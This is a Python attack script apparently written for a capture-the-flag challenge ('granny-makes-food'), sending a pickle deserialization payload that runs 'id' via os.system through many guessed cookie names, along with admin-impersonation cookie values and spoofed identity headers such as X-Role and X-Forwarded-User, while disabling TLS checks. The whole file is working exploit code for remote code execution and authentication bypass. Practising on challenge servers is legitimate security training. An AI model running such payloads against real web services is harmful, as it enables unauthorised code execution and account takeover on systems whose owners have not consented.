import requests, base64, pickle, os, concurrent.futures as cf
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
class R:
    def __reduce__(self): return (os.system, ("id",))
raw=pickle.dumps(R())
b64=base64.b64encode(raw).decode()
names=["user","username","admin","session","auth","token","data","granny","food","item","items","sour","souritem","pickle","role","uid","id","name","account","profile","cart","order"]
vals=[raw.decode('latin1'), b64, "admin", "1", "'", '{"role":"admin"}']
hdrnames=["X-Admin","X-User","X-Username","X-Role","X-Forwarded-User","Authorization"]
def test(args):
    n,v=args
    try:
        r=requests.get(URL, cookies={n:v}, timeout=10, verify=False)
        if r.status_code!=200 or len(r.content)!=1481:
            return ("COOKIE",n,repr(v)[:40],r.status_code,len(r.content))
    except Exception as e:
        return ("COOKIE-ERR",n,repr(v)[:40],str(e)[:60])
    return None
tasks=[(n,v) for n in names for v in vals]
outs=[]
with cf.ThreadPoolExecutor(max_workers=20) as ex:
    for r in ex.map(test,tasks):
        if r: outs.append(r)
print("COOKIE anomalies:", outs)
# headers
def th(h):
    try:
        r=requests.get(URL, headers={h:"admin"}, timeout=10, verify=False)
        if r.status_code!=200 or len(r.content)!=1481:
            return ("HDR",h,r.status_code,len(r.content))
    except Exception as e:
        return ("HDR-ERR",h,str(e)[:60])
    return None
with cf.ThreadPoolExecutor(max_workers=10) as ex:
    for r in ex.map(th,hdrnames):
        if r: print(r)
print("DONE")
